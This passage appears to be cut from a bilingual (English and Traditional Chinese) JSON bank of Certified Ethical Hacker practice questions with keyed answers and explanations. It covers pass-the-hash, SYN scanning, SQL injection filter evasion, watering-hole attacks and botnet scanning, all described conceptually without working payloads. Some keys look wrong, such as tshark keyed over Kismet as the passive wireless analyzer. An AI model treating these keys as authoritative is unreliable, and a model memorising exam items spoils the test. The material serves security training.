    "選項: A. B. C. D.": "A. Run the potentially malicious program on the sheep dip computer to determine its behavior (在隔離電腦上運行潛在的惡意程式以確定其行為) B. Store the potentially malicious program on an external medium, such as a CD-ROM (將潛在的惡意程式儲存在外部介質上，例如 CD-ROM) C. Connect the sheep dip computer to the organization's internal network (將隔離電腦連接到組織的內部網路) D. Install the potentially malicious program on the sheep dip computer (在隔離電腦上安裝潛在的惡意程式)",
    "Answer": "B",
    "Explanation": "隔離電腦（Sheep Dip Computer）是一種專門用於測試入站檔案或實體介質以尋找惡意軟體的設備，它與組織網路隔離。在開始分析之前，應將潛在的惡意程式**儲存在外部介質上（如 CD-ROM）**，並將其插入隔離電腦，這能有效防止惡意軟體傳播 [cite: 9000]。"
  },
  {
    "Question :": "57",
    "EN": "An organization has been experiencing intrusion attempts despite deploying an Intrusion Detection System (IDS) and Firewalls. As a Certified Ethical Hacker, you are asked to reinforce the intrusion detection process and recommend a better rule-based approach. The IDS uses Snort rules and the new recommended tool should be able to complement it. You suggest using **YARA rules** with an additional tool for rule generation. Which of the following tools would be the best choice for this purpose and why?",
    "C": "一個組織儘管部署了 IDS 和防火牆，但仍經歷入侵嘗試。作為 CEH，您被要求加強入侵偵測流程並推薦更好的**基於規則的方法**。IDS 使用 Snort 規則，新推薦的工具應該能夠輔助它。您建議使用 **YARA 規則**和一個額外的工具來生成規則。以下哪個工具是實現此目的的最佳選擇，為什麼？",
    "選項: A. B. C. D.": "A. AutoYara - Because it automates the generation of YARA rules from a set of malicious and benign files (因為它從一組惡意和良性檔案自動生成 YARA 規則) B. yarGen - Because it generates YARA rules from strings identified in malware files while removing strings that also appear in goodware files (因為它從惡意軟體檔案中識別出的字串生成 YARA 規則，同時移除也出現在良性軟體檔案中的字串) C. YaraRET - Because it helps in reverse engineering Trojans to generate YARA rules (因為它有助於逆向工程木馬以生成 YARA 規則) D. koodous - Because it combines social networking with antivirus signatures and YARA rules to detect malware (因為它結合了社交網路、防毒特徵碼和 YARA 規則來偵測惡意軟體)",
    "Answer": "B",
    "Explanation": "**yarGen** 是生成 YARA 規則的最佳工具，因為它能從惡意軟體檔案中提取字串，同時會過濾掉在良性軟體（goodware files）中也存在的常見字串。這有助於**減少誤報**並提高 YARA 規則的準確性 [cite: 9029, 9030]。"
  },
  {
    "Question :": "58",
    "EN": "A penetration tester is performing an enumeration on a client's network. The tester has acquired permission to perform enumeration activities. They have identified a remote inter-process communication (IPC) share and are trying to collect more information about it. The tester decides to use a common enumeration technique to collect the desired data. Which of the following techniques would be most appropriate for this scenario?",
    "C": "一名滲透測試人員正在客戶網路上執行列舉。測試人員已獲得執行列舉活動的許可。他們識別出了一個遠端**程序間通訊（IPC）共享**，並正試圖收集更多關於它的資訊。測試人員決定使用一種常見的列舉技術來收集所需的資料。以下哪種技術最適合此情景？",
    "選項: A. B. C. D.": "A. Brute force Active Directory (暴力破解 Active Directory) B. Probe the IPC share by attempting to brute force admin credentials (嘗試暴力破解管理員憑證來探測 IPC 共享) C. Extract usernames using email IDs (使用電子郵件 ID 提取使用者名稱) D. Conduct a DNS zone transfer (執行 DNS 區域傳輸)",
    "Answer": "B",
    "Explanation": "IPC 共享（特別是 Windows 上的 IPC$ 共享）是遠端通訊的重要部分。透過嘗試**暴力破解管理員憑證**來存取 IPC 共享，可以揭示有關目標系統的寶貴資訊，例如其作業系統、服務、使用者、群組和共享 [cite: 9053]。"
  },
  {
    "Question :": "59",
    "EN": "Mary, a penetration tester, has found password hashes in a client system she managed to breach. She needs to use these passwords to continue with the test, but she does not have time to find the passwords that correspond to these hashes. Which type of attack can she implement in order to continue?",
    "C": "滲透測試人員 Mary 在她設法入侵的客戶端系統中發現了**密碼雜湊**。她需要使用這些密碼來繼續測試，但她沒有時間找到與這些雜湊對應的密碼。為了繼續測試，她可以實施哪種類型的攻擊？",
    "選項: A. B. C. D.": "A. LLMNR/NBT-NS poisoning (LLMNR/NBT-NS 毒化) B. Internal monologue attack (內部獨白攻擊) C. Pass the ticket (傳遞票證) D. Pass the hash (傳遞雜湊)",
    "Answer": "D",
    "Explanation": "傳遞雜湊（Pass the Hash, PtH）攻擊允許攻擊者在不實際知道明文密碼的情況下，利用竊取的**密碼雜湊值**來驗證對網路資源的存取權限。由於 Mary 已經獲取了雜湊，但沒有時間破解密碼，PtH 是繼續測試的最有效方法。"
  },
  {
    "Question :": "60",
    "EN": "What type of virus is most likely to remain undetected by antivirus software?",
    "C": "哪種類型的病毒最有可能未被防毒軟體偵測到？",
    "選項: A. B. C. D.": "A. Cavity virus (腔體病毒) B. Stealth virus (隱形病毒) C. File-extension virus (檔案副檔名病毒) D. Macro virus (巨集病毒)",
    "Answer": "B",
    "Explanation": "**隱形病毒**（Stealth virus）是一種惡意軟體，它使用複雜的技術（如修改作業系統的核心或檔案結構）來主動**隱藏**自身在受感染系統上的存在，使其難以被傳統的防毒軟體偵測到。"
  },
  {
    "Question :": "61",
    "EN": "An ethical hacker is scanning a target network. They initiate a TCP connection by sending an SYN packet to a target machine and receiving a SYN/ACK packet in response. But instead of completing the three-way handshake with an ACK packet, they send an RST packet. What kind of scan is the ethical hacker likely performing and what is their goal?",
    "C": "一名道德駭客正在掃描目標網路。他們透過向目標機器發送 **SYN 封包**來啟動 TCP 連線，並接收 **SYN/ACK 封包**作為回應。但他們沒有用 ACK 封包完成三向握手，而是發送了 **RST 封包**。該道德駭客可能正在執行哪種掃描？他們的目標是什麼？",
    "選項: A. B. C. D.": "A. They are performing an SYN scan to stealthily identify open ports without fully establishing a connection (他們正在執行 SYN 掃描，以在不完全建立連線的情況下秘密識別開放埠) B. They are performing a TCP connect scan to identify open ports on the target machine (他們正在執行 TCP 連線掃描，以識別目標機器上的開放埠) C. They are performing a vulnerability scan to identify any weaknesses in the target system (他們正在執行漏洞掃描，以識別目標系統中的任何弱點) D. They are performing a network scan to identify live hosts and their IP addresses (他們正在執行網路掃描，以識別活動主機及其 IP 位址)",
    "Answer": "A",
    "Explanation": "這種技術被稱為 **SYN 掃描**（或**半開放掃描**，Half-open scan），它利用 TCP 三向握手的過程。駭客不發送最終的 ACK 來完成連線，而是發送 RST 來中止連線。這樣做可以在不創建完整連線記錄的情況下，**秘密地**（stealthily）識別開放埠，從而降低被目標系統日誌記錄的風險。"
  },
  {
    "Question :": "62",
    "EN": "During a reconnaissance mission, an ethical hacker uses Maltego, a popular footprinting tool, to collect information about a target organization. The information includes the target's Internet infrastructure details (domains, DNS names, Netblocks, IP address information). The hacker decides to use social engineering techniques to gain further information. Which of the following would be the least likely method of social engineering to yield beneficial information based on the data collected?",
    "C": "在偵察任務中，道德駭客使用流行的足跡工具 Maltego 收集有關目標組織的資訊。這些資訊包括目標的網際網路基礎設施詳細資訊（網域、DNS 名稱、網路區塊、IP 位址資訊）。駭客決定使用社交工程技術來獲取進一步資訊。根據收集到的資料，以下哪一項最不可能是用於獲取有益資訊的社交工程方法？",
    "選項: A. B. C. D.": "A. Shoulder surfing to observe sensitive credentials input on the target's computers (肩窺以觀察目標電腦上輸入的敏感憑證) B. Impersonating an ISP technical support agent to trick the target into providing further network details (冒充 ISP 技術支援代理商以欺騙目標提供更多網路詳細資訊) C. Dumpster diving in the target company’s trash bins for valuable printouts (在目標公司的垃圾桶中翻找有價值的列印資料) D. Eavesdropping on internal corporate conversations to understand key topics (竊聽內部公司對話以了解關鍵主題)",
    "Answer": "A",
    "Explanation": "Maltego 收集的資訊（網域、IP 位址）屬於**遠端網路情報**。而**肩窺（Shoulder surfing）**是一種需要**實體接近**目標電腦的攻擊手段。因此，基於已收集的遠端網路資料，直接轉為需要物理存取的肩窺，是**最不可能**（least likely）能立即產生效益的方法。"
  },
  {
    "Question :": "63",
    "EN": "As an IT Security Analyst, you’ve been asked to review the security measures of an e-commerce website that relies on a SQL database for storing sensitive customer data. You suspect an attacker might employ a blind' SQL Injection attack, taking advantage of the application's true or false responses to extract data bit by bit. The security measures include strong input validation and pattern matching measures that are based on the application’s responses. What evasion technique can be used by the attacker to bypass the application's defenses?",
    "C": "作為 IT 安全分析師，您的任務是審查依賴 SQL 資料庫儲存敏感客戶資料的電子商務網站的安全措施。您懷疑攻擊者可能利用應用程式的**真/假回應**來逐位元提取資料，執行**盲注 SQL 注入**。安全措施包括基於應用程式回應的強大輸入驗證和模式匹配措施。攻擊者可以使用什麼規避技術來繞過應用程式的防禦？",
    "選項: A. B. C. D.": "A. The hacker could deploy an 'out-of-band' SQL Injection attack, extracting data via a different communication channel, such as DNS or HTTP requests (駭客可以部署「帶外」SQL 注入攻擊，透過不同的通訊通道（例如 DNS 或 HTTP 請求）提取資料) B. The hacker may resort to a DDoS attack instead, attempting to crash the server and thus render the e commerce site unavailable (駭客可能會轉而採用 DDoS 攻擊，試圖使伺服器崩潰，從而使電子商務網站無法使用) C. The hacker may try to use SQL commands which are less known and less likely to be blocked by your system's security (駭客可能會嘗試使用不太為人所知且不太可能被您系統的安全措施阻止的 SQL 命令) D. The hacker might employ a blind' SQL Injection attack, taking advantage of the application's true or false responses to extract data bit by bit (駭客可能會採用「盲注」SQL 注入攻擊，利用應用程式的真/假回應逐位元提取資料)",
    "Answer": "A",
    "Explanation": "由於應用程式對**帶內**回應（例如頁面內容）有強大的防禦，攻擊者可能會轉向使用**帶外（Out-of-band）SQL 注入**。這種技術利用資料庫伺服器發出**外部網路請求**（如 DNS 或 HTTP）的能力，透過這些不同的通道將數據傳輸給攻擊者，從而繞過應用程式層的響應過濾。"
  },
  {
    "Question :": "64",
    "EN": "In an attempt to damage the reputation of a competitor organization, Hailey, a professional hacker, gathers a list of employee and client email addresses and other related information by using various search engines, social networking sites, and web spidering tools. In this process, she also uses an automated tool to gather a **list of words** from the target website. What is the tool used by Hailey for gathering a list of words from the target website?",
    "C": "為了損害競爭對手組織的聲譽，專業駭客 Hailey 使用各種搜尋引擎、社群網站和 Web 爬蟲工具收集了員工和客戶電子郵件位址及其他相關資訊。在此過程中，她還使用一個自動化工具來從目標網站收集一個**單字列表**。Hailey 用於從目標網站收集單字列表的工具是什麼？",
    "選項: A. B. C. D.": "A. Shadowsocks B. CeWL C. Psiphon D. Orbot",
    "Answer": "B",
    "Explanation": "**CeWL**（Custom Word List generator）是一個專門設計的工具，用於**爬取網站內容**並生成可用於字典攻擊的**自訂單字列表**（Custom Word List）。"
  },
  {
    "Question :": "65",
    "EN": "What is the least important information when you analyze a public IP address in a security alert?",
    "C": "當您分析安全警報中的公共 IP 位址時，哪個資訊最不重要？",
    "選項: A. B. C. D.": "A. DNS B. Whois C. Geolocation D. ARP",
    "Answer": "D",
    "Explanation": "當分析**公共 IP 位址**時，DNS、Whois 和地理位置（Geolocation）提供了有關其身份、所有權和位置的遠端情報。而 **ARP（Address Resolution Protocol）**用於將 IP 位址解析為 MAC 位址，**僅限於本地網路段**（Local Segment）內運行。因此，對於分析公共 IP 的遠端警報來說，ARP 資訊最不重要。"
  },
  {
    "Question :": "66",
    "EN": "Joel, a professional hacker, targeted a company and identified the types of websites frequently visited by its employees. Using this information, he searched for possible loopholes in these websites and injected a malicious script that can redirect users from the web page and download malware onto a victim's machine. Joel waits for the victim to access the infected web application so as to compromise the victim's machine. Which of the following techniques is used by Joel in the above scenario?",
    "C": "專業駭客 Joel 鎖定了一家公司，並識別了其員工經常訪問的網站類型。他利用這些資訊，在這些網站中搜尋可能的漏洞並注入了一個惡意腳本，該腳本可以將使用者從網頁重定向並下載惡意軟體到受害者的機器上。Joel 等待受害者存取受感染的 Web 應用程式，從而危害受害者的機器。Joel 在上述情景中使用了以下哪種技術？",
    "選項: A. B. C. D.": "A. DNS rebinding attack (DNS 重綁定攻擊) B. Clickjacking attack (點擊劫持攻擊) C. MarioNet attack (MarioNet 攻擊) D. Watering hole attack (水坑攻擊)",
    "Answer": "D",
    "Explanation": "**水坑攻擊**（Watering hole attack）是指攻擊者識別目標群體（例如某公司員工）經常訪問的網站，然後**感染這些網站**，等待目標受害者上鉤。這就像捕食者在獵物經常光顧的水源（水坑）處守候一樣。"
  },
  {
    "Question :": "67",
    "EN": "if you send a TCP ACK segment to a known closed port on a firewall but it does not respond with an RST. what do you know about the firewall you are scanning?",
    "C": "如果您向防火牆上一個**已知關閉的埠**發送 **TCP ACK** 區段，但它**沒有回覆 RST**。您對正在掃描的防火牆了解多少？",
    "選項: A. B. C. D.": "A. There is no firewall in place. (沒有設置防火牆) B. This event does not tell you encrypting about the firewall. (此事件不會告訴您有關防火牆的任何加密資訊) C. It is a stateful firewall (這是一個有狀態防火牆) D. It Is a non-stateful firewall. (這是一個無狀態防火牆)",
    "Answer": "B",
    "Explanation": "當一個 ACK 封包發送到一個關閉的埠時，根據 TCP 協定，它應該回覆一個 RST 封包。如果**沒有回覆 RST**，這表示封包在到達目標主機**之前**就被**丟棄**了，這強烈暗示存在一個**過濾設備**（防火牆）。然而，僅憑 ACK 封包沒有回應，**無法**確定該過濾設備是**有狀態（Stateful）**還是**無狀態（Stateless）**防火牆。因為沒有回應只表明它正在過濾流量。"
  },
  {
    "Question :": "68",
    "EN": "Which Nmap option would you use if you were not concerned about being detected and wanted to perform a very fast scan?",
    "C": "如果您**不關心是否被偵測**，並且想執行**非常快速**的掃描，您會使用哪個 Nmap 選項？",
    "選項: A. B. C. D.": "A. -T5 B. -O C. -T0 D. -A",
    "Answer": "A",
    "Explanation": "Nmap 的 **`-T`** 標誌用於設定計時範本。**`-T5`**（稱為 **Insane** 模式）是**最快**的掃描模式，它犧牲了隱蔽性和可靠性來換取速度，適用於**不關心被偵測**的情況。"
  },
  {
    "Question :": "69",
    "EN": "An IT company has just implemented new security controls to their network and system setup. As a Certified Ethical Hacker, your responsibility is to assess the possible vulnerabilities in the new setup. You are given the information that the network and system are adequately patched with the latest updates, and all employees have gone through recent cybersecurity awareness training. Considering the potential vulnerability sources, what is the **best initial approach** to vulnerability assessment?",
    "C": "該公司已實施新的安全控制且系統已充分修補。考慮到潛在的漏洞來源，漏洞評估的**最佳初始方法**是什麼？",
    "選項: A. B. C. D.": "A. Checking for hardware and software misconfigurations to identify any possible loopholes (檢查硬體和軟體配置錯誤以識別任何可能的漏洞) B. Evaluating the network for inherent technology weaknesses prone to specific types of attacks (評估網路是否存在容易遭受特定類型攻擊的固有技術弱點) C. Investigating if any ex-employees still have access to the company’s system and data (調查是否有任何前員工仍可存取公司的系統和資料) D. Conducting social engineering tests to check if employees can be tricked into revealing sensitive information (進行社交工程測試以檢查員工是否會被騙而洩露敏感資訊)",
    "Answer": "A",
    "Explanation": "即使系統已打補丁，**硬體和軟體配置錯誤（misconfigurations）**仍是常見的漏洞來源 [cite: 4602]。因此，在初始漏洞評估中，檢查硬體和軟體配置錯誤是識別漏洞的最佳技術方法 [cite: 4601]。"
  },
  {
    "Question :": "70",
    "EN": "Which tier in the N-tier application architecture is responsible for moving and processing data between the tiers?",
    "C": "在 N 層應用程式架構中，哪一層負責**在各層之間移動和處理資料**？",
    "選項: A. B. C. D.": "A. Presentation tier (展示層) B. Application Layer (應用程式層) C. Logic tier (邏輯層) D. Data tier (資料層)",
    "Answer": "C",
    "Explanation": "在 N 層架構中，**邏輯層**（Logic Tier）包含應用程式的核心業務邏輯，負責處理業務規則、**在各層之間移動和處理資料**（例如，接收來自展示層的請求並與資料層互動）。"
  },
  {
    "Question :": "71",
    "EN": "A large corporate network is being subjected to repeated sniffing attacks. To increase security, the company’s IT department decides to implement a combination of several security measures. They permanently add theMAC address of the gateway to the ARP cache, switch to using IPv6 instead of IPv4, implement the use of encrypted sessions such as SSH instead of Telnet, and use Secure File Transfer Protocol instead of FTP. However, they are still faced with the threat of sniffing. Considering the countermeasures, what should be their next step to enhance network security?",
    "C": "一家大型公司網路受到重複的嗅探攻擊。為提高安全性，該公司的 IT 部門決定實施多種安全措施的組合。他們永久將閘道的 MAC 位址添加到 ARP 快取中，切換到使用 IPv6 而不是 IPv4，使用 SSH 等加密會話取代 Telnet，並使用安全檔案傳輸協定取代 FTP。然而，他們仍然面臨嗅探威脅。考慮到這些對策，他們下一步應該採取什麼措施來增強網路安全性？",
    "選項: A. B. C. D.": "A. Use HTTP instead of HTTPS for protecting usernames and passwords (使用 HTTP 而不是 HTTPS 來保護使用者名稱和密碼) B. Implement network scanning and monitoring tools (實施網路掃描和監控工具) C. Enable network identification broadcasts (啟用網路識別廣播) D. Retrieve MAC addresses from the OS (從 OS 檢索 MAC 位址)",
    "Answer": "B",
    "Explanation": "儘管公司已採取了加密通訊（SSH、SFTP）和 ARP/IP 欺騙防禦措施，但攻擊者仍可能使用主動或被動嗅探技術。下一步是實施**網路掃描和監控工具**，以偵測未經授權的設備（如惡意存取點或嗅探器），並監控異常流量模式，例如過多的 ARP 請求或 DNS 查詢 [cite: 10944, 10946]。"
  },
  {
    "Question :": "72",
    "EN": "Which of the following is a passive wireless packet analyzer that works on Linux-based systems?",
    "C": "以下哪一項是適用於基於 Linux 系統的**被動式無線封包分析器**？",
    "選項: A. B. C. D.": "A. Burp Suite B. OpenVAS C. tshark D. Kismet",
    "Answer": "C",
    "Explanation": "雖然 **Kismet** 也是一個著名的無線嗅探器，但 **tshark** 是 Wireshark 的命令列版本 [cite: 10960]，能夠捕獲和分析網路流量，包括在適當驅動程式下對無線網路進行**被動封包分析**。"
  },
  {
    "Question :": "73",
    "EN": "An attacker can employ many methods to perform social engineering against unsuspecting employees, including scareware. What is the best example of a scareware attack?",
    "C": "攻擊者可以採用多種方法對毫無戒心的員工進行社交工程，包括恐嚇軟體（scareware）。恐嚇軟體攻擊的最佳範例是什麼？",
    "選項: A. B. C. D.": "A. A pop-up appears to a user stating, \"You have won a free cruise! Click here to claim your prize!\" (向使用者彈出一個視窗，聲明：「您贏得了一次免費遊輪！點擊此處領取獎品！」) B. A banner appears to a user stating, \"Your account has been locked. Click here to reset your password and unlock your account.\" (向使用者出現一個橫幅，聲明：「您的帳戶已被鎖定。點擊此處重設密碼並解鎖您的帳戶。」) C. A banner appears to a user stating, \"Your Amazon order has been delayed. Click here to find out your new delivery date.\" (向使用者出現一個橫幅，聲明：「您的亞馬遜訂單已延遲。點擊此處查詢新的交付日期。」) D. A pop-up appears to a user stating, \"Your computer may have been infected with spyware. Click here to install an anti-spyware tool to resolve this issue.\" (向使用者彈出一個視窗，聲明：「您的電腦可能已被間諜軟體感染。點擊此處安裝反間諜軟體工具以解決此問題。」)",
    "Answer": "D",
    "Explanation": "恐嚇軟體（Scareware）攻擊是透過向使用者發送**虛假的威脅或警告**（例如聲稱電腦已感染病毒或間諜軟體 [cite: 10970]），來誘騙他們購買或下載無用或惡意的軟體（例如虛假的反間諜軟體工具） [cite: 10970]。"
  },
  {
    "Question :": "74",
    "EN": "Henry is a penetration tester who works for XYZ organization. While performing enumeration on a client organization, he **queries the DNS server for a specific cached DNS record**. Further, by using this cached record, he **determines the sites recently visited** by the organization's user. What is the enumeration technique used by Henry on the organization?",
    "C": "Henry 查詢 DNS 伺服器以獲取特定的**快取 DNS 記錄**，並利用此快取記錄來確定使用者最近訪問的網站。他使用的列舉技術是什麼？",
    "選項: A. B. C. D.": "A. DNS zone walking (DNS 區域遍歷) B. DNS cache snooping (DNS 快取窺探) C. DNS SEC zone walking (DNS SEC 區域遍歷) D. DNS cache poisoning (DNS 快取投毒)",
    "Answer": "B",
    "Explanation": "**DNS 快取窺探 (DNS cache snooping)**是一種技術，透過查詢 DNS 伺服器來確定其快取中是否有特定記錄，從而推斷出目標網路使用者最近訪問的網站。"
  },
  {
    "Question :": "75",
    "EN": "James is working as an ethical hacker at Technix Solutions. The management ordered James to discover how vulnerable its network is towards footprinting attacks. James took the help of an open-source framework for performing automated reconnaissance activities. This framework helped James in gathering information using free tools and resources. What is the framework used by James to conduct footprinting and reconnaissance activities?",
    "C": "James 在 Technix Solutions 擔任道德駭客。管理層命令 James 發現其網路對足跡攻擊的脆弱程度。James 藉助一個**開源框架**來執行自動化偵察活動。該框架幫助 James 使用免費工具和資源收集資訊。James 用於執行足跡和偵察活動的框架是什麼？",
    "選項: A. B. C. D.": "A. WebSploit Framework B. Browser Exploitation Framework C. OSINT framework (OSINT 框架) D. SpeedPhish Framework",
    "Answer": "C",
    "Explanation": "**OSINT 框架**（Open Source Intelligence framework）是一種結構化的開源工具和資源集合，用於從**公開**可用的資訊中收集情報，這正是足跡（footprinting）和偵察活動的核心 [cite: 10991]。"
  },
  {
    "Question :": "76",
    "EN": "A company’s Web development team has become aware of a certain type of security vulnerability in their Web software. To mitigate the possibility of this vulnerability being exploited, the team wants to modify the software requirements to **disallow users from entering HTML as input** into their Web application. What kind of Web application vulnerability likely exists in their software?",
    "C": "一家公司的 Web 開發團隊已經意識到他們的 Web 軟體中存在某種安全漏洞。為減輕此漏洞被利用的可能性，該團隊希望修改軟體要求，以**禁止使用者將 HTML 作為輸入**輸入到他們的 Web 應用程式中。他們的軟體中可能存在哪種 Web 應用程式漏洞？",
    "選項: A. B. C. D.": "A. Cross-site scripting vulnerability (跨站腳本漏洞) B. SQL injection vulnerability (SQL 注入漏洞) C. Web site defacement vulnerability (網站篡改漏洞) D. Gross-site Request Forgery vulnerability (跨站請求偽造漏洞)",
    "Answer": "A",
    "Explanation": "禁止使用者輸入 HTML 是對抗 **跨站腳本（XSS）漏洞** [cite: 11003] 的主要措施。XSS 攻擊涉及將惡意 HTML 或腳本程式碼注入網頁，如果應用程式不當心處理或淨化內容，這些程式碼將在其他使用者的瀏覽器中執行 [cite: 11015]。"
  },
  {
    "Question :": "77",
    "EN": "Kevin, a professional hacker, wants to penetrate CyberTech Inc.’s network. He employed a technique, using which he **encoded packets with Unicode characters**[cite: 11021]. The company’s IDS cannot recognize the packet, but the target web server can decode them. What is the technique used by Kevin to evade the IDS system?",
    "C": "專業駭客 Kevin 想要滲透 CyberTech Inc. 的網路。他使用了一種技術，用 **Unicode 字元對封包進行編碼** [cite: 11021]。該公司的 IDS 無法識別該封包，但目標 Web 伺服器可以對其進行解碼。Kevin 用於規避 IDS 系統的技術是什麼？",
    "選項: A. B. C. D.": "A. Desynchronization (不同步) B. Obfuscating (混淆) C. Session splicing (會話拼接) D. Urgency flag (緊急標誌)",
    "Answer": "B",
    "Explanation": "**混淆（Obfuscating）**是一種規避防禦的常見行為，駭客透過加密、編碼或以其他方式混淆酬載的內容（例如使用 **Unicode 編碼** [cite: 11021]），使防禦工具（如 IDS）難以或無法偵測惡意內容 [cite: 11030]。"
  },
  {
    "Question :": "78",
    "EN": "A large e-commerce organization is planning to implement a vulnerability assessment solution to enhance its security posture. They require a solution that imitates the outside view of attackers, performs well-organized inference-based testing, scans automatically against continuously updated databases, and supports multiple networks. Given these requirements, which type of vulnerability assessment solution would be most appropriate?",
    "C": "一家大型電子商務組織正計劃實施漏洞評估解決方案以增強其安全態勢。他們需要的解決方案能夠**模仿攻擊者的外部視角** [cite: 11056]、執行組織良好的**基於推論的測試** [cite: 11057]、自動掃描持續更新的資料庫，並支援多個網路。鑑於這些要求，哪種類型的漏洞評估解決方案最合適？",
    "選項: A. B. C. D.": "A. Inference-based assessment solution (基於推論的評估解決方案) B. Service-based solution offered by an auditing firm (稽核公司提供的基於服務的解決方案) C. Tree-based assessment approach (基於樹狀的評估方法) D. Product-based solution installed on a private network (安裝在私有網路上的基於產品的解決方案)",
    "Answer": "B",
    "Explanation": "基於服務的解決方案（Service-based solution）由外部專家（如稽核公司 [cite: 11055]）執行，可以**模仿攻擊者的外部視角** [cite: 11056]，並擁有最新的情報和工具庫，從而能滿足大規模組織全面性、外部視角和持續更新的測試要求 [cite: 11058, 11059]。"
  },
  {
    "Question :": "79",
    "EN": "An ethical hacker is testing the security of a website's database system against SQL Injection attacks. They discover that the IDS has a strong signature detection mechanism to detect typical SQL injection patterns. Which evasion technique can be most effectively used to bypass the IDS signature detection while performing a SQL Injection attack?",
    "C": "一名道德駭客正在測試網站資料庫系統對 SQL 注入攻擊的安全性。他們發現 IDS 具有強大的特徵碼偵測機制來偵測典型的 SQL 注入模式。在執行 SQL 注入攻擊時，可以使用哪種規避技術最有效地繞過 IDS 特徵碼偵測？",
    "選項: A. B. C. D.": "A. Implement case variation by altering the case of SQL statements (透過改變 SQL 語句的大小寫來實施大小寫變體) B. Employ IP fragmentation to obscure the attack payload (採用 IP 碎片化來混淆攻擊酬載) C. Use Hex encoding to represent the SQL query string (使用十六進位編碼來表示 SQL 查詢字串) D. Leverage string concatenation to break identifiable keywords (利用字串串聯來破壞可識別的關鍵字)",
    "Answer": "D",
    "Explanation": "大多數 SQL 引擎和 IDS 對大小寫不敏感 (A)，IP 碎片化 (B) 在網路層面，對內容無效。最有效的規避技術是利用**字串串聯** (String Concatenation)，將關鍵字（例如 `OR`）分解成多個部分（例如 `O` || `R`），**破壞** IDS 的特徵碼匹配，同時資料庫仍能執行該語句 [cite: 11096, 11098, 11099]。"
  },
  {
    "Question :": "80",
    "EN": "Morris, an attacker, wanted to check whether the target AP is in a locked state. He attempted using different utilities to identify **WPS-enabled APs** in the target wireless network. Ultimately, he succeeded with one special command-line utility. Which of the following command-line utilities allowed Morris to discover the WPS-enabled APs?",
    "C": "攻擊者 Morris 試圖使用命令列公用程式來識別目標無線網路中**啟用 WPS** 的 AP。哪個公用程式允許 Morris 發現啟用 WPS 的 AP？",
    "選項: A. B. C. D.": "A. wash B. ntptrace C. macof D. net View",
    "Answer": "A",
    "Explanation": "**`wash`** 是一個命令列工具，專門用於掃描無線網路以尋找啟用 **WPS (Wi-Fi Protected Setup)** 的存取點，並檢查它們是否處於鎖定狀態。"
  },
  {
    "Question :": "81",
    "EN": "To create a botnet. the attacker can use several techniques to scan vulnerable machines. The attacker first collects Information about a large number of vulnerable machines to create a list. Subsequently, they infect the machines. The list Is divided by assigning half of the list to the newly compromised machines. The scanning process runs simultaneously. This technique ensures the spreading and installation of malicious code in little time. Which technique is discussed here?",
    "C": "為了創建殭屍網路，攻擊者可以使用幾種技術來掃描易受攻擊的機器。攻擊者首先收集大量易受攻擊機器的資訊以創建一個列表 [cite: 1627]。隨後，他們感染機器 [cite: 1628]。該列表透過將一半列表分配給新受損的機器來進行劃分 [cite: 1628]。掃描過程同時運行 [cite: 1629]。這種技術確保了惡意程式碼在短時間內傳播和安裝 [cite: 1629]。這裡討論的是哪種技術？",
    "選項: A. B. C. D.": "A. Hit-list-scanning technique (命中列表掃描技術) B. Topological scanning technique (拓撲掃描技術) C. Subnet scanning technique (子網掃描技術) D. Permutation scanning technique (排列掃描技術)",
    "Answer": "A",
    "Explanation": "該技術被稱為**命中列表掃描（Hit-list scanning）** [cite: 1639]。在蠕蟲發布之前，攻擊者會收集一個易受攻擊機器的列表（命中列表）[cite: 1640]。一旦蠕蟲感染了一台機器，它就會將命中列表分成兩半，確保蠕蟲可以在短時間內在所有易受攻擊的機器上建立起來，從而加速初始感染 [cite: 1642, 1645]。"
  },
  {
    "Question :": "82",
    "EN": "As a cybersecurity professional, you are responsible for securing a high-traffic web application... The application's security measures include **filtering special characters in user inputs**... If the hacker still intends to exploit this SQL Injection vulnerability, which strategy is he most likely to employ?",
    "C": "應用程式的安全措施包括過濾使用者輸入中的**特殊字元**。如果駭客仍想利用 SQL 注入漏洞，他最可能採用哪種策略？",
    "選項: A. B. C. D.": "A. The hacker alters his approach and injects a ‘DROP TABLE’ statement, a move that could potentially lead to the loss of vital data stored in the application's database B. The hacker tries to manipulate the 'UNION' keyword in such a way that it triggers a database error, potentially revealing valuable information about the database's structure C. The hacker switches tactics and resorts to a ‘time-based blind’ SQL Injection attack, which would force the application to delay its response, thereby revealing information based on the duration of the delay D. The hacker attempts to bypass the **special character filter by encoding his malicious input**, which could potentially enable him to successfully inject damaging SQL queries",
    "Answer": "D",
    "Explanation": "由於應用程式對特殊字元進行過濾，駭客無法直接輸入惡意字串。最有效的規避策略是透過 **URL 編碼**或十六進位編碼等方式，**編碼**惡意輸入，從而繞過過濾器。"
  },
  {
    "Question :": "83",
    "EN": "Cross-site request forgery involves:",
    "C": "跨站請求偽造（Cross-site request forgery）涉及：",
    "選項: A. B. C. D.": "A. A request sent by a malicious user from a browser to a server (惡意使用者從瀏覽器發送到伺服器的請求) B. Modification of a request by a proxy between client and server (代理在客戶端和伺服器之間修改請求) C. A browser making a request to a server without the user’s knowledge (瀏覽器在使用者不知情的情況下向伺服器發出請求) D. A server making a request to another server without the user’s knowledge (伺服器在使用者不知情的情況下向另一個伺服器發出請求)",
    "Answer": "C",
    "Explanation": "跨站請求偽造（CSRF）是一種攻擊，它強制最終使用者在他們已通過身份驗證的 Web 應用程式上執行他們**不打算執行的操作** [cite: 1721]。通常是透過在**使用者不知情**的情況下，讓瀏覽器發出惡意請求來實現的 [cite: 1725]。"
  },
  {
    "Question :": "84",
    "EN": "A penetration tester is conducting an assessment of a web application for a financial institution. The application uses form-based authentication and does not implement account lockout policies after multiple failed login attempts. Interestingly, the application displays detailed error messages that disclose whether the username or password entered is incorrect. The tester also notices that the application uses HTTP headers to prevent clickjacking attacks but does not implement Content Security Policy (CSP). With these observations, which of the following attack methods would likely be the most effective for the penetration tester to exploit these vulnerabilities and attempt unauthorized access?",
    "C": "一名滲透測試人員正在對一家金融機構的 Web 應用程式進行評估。該應用程式使用基於表單的身份驗證，並且在多次登入失敗後**未實施帳戶鎖定策略** [cite: 1743]。有趣的是，該應用程式顯示**詳細的錯誤訊息**，揭示輸入的使用者名稱或密碼是否不正確 [cite: 1744]。測試人員也注意到該應用程式使用 HTTP 標頭來防止點擊劫持攻擊，但未實施內容安全政策（CSP）。根據這些觀察結果，以下哪種攻擊方法最有可能對滲透測試人員有效，以利用這些漏洞並嘗試未經授權的存取？",
